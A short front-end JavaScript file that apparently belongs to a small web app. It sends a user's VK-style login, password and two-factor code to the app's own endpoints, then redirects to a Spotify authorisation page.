function auth(){
    try {
        login = document.getElementById('login').value
        pass = document.getElementById('pass').value
        this.resp = null
        $(function () {
            $.ajax({
                url: '/get_auth_data',
                type: 'POST',
                contentType: 'application/json;charset=UTF-8',
                dataType: 'json',
                data : JSON.stringify({
                    'login': login,
                    'pass' : pass 
                }),
                success: function (response) {
                    console.log(response);
                    if (response['2fa_required']) {
                        hide_auth_data()
                    }
                },
                error: function (error) {}
            });
        })
    } catch (error) {
        code = document.getElementById('2fa_code').value
        $(function () {
            $.ajax({
                url: '/get_code',
                type: 'POST',
                contentType: 'application/json;charset=UTF-8',
                dataType: 'json',
                data : JSON.stringify({
                    'code': String(code)
                }),
                success: function (response) {
                    if (response.success === true){
                        console.log('2141385')
                        window.location.href = '/auth_spotify';
                    }
                },
                error: function (error) {}
            });
        })
    }
}


function hide_auth_data() {
    document.getElementById('vk_auth_login').remove()
    document.getElementById('vk_auth_pass').remove()
    document.getElementById('hidden_2fa').style.display = 'block'
    value = document.getElementById('hidden_2fa')

}
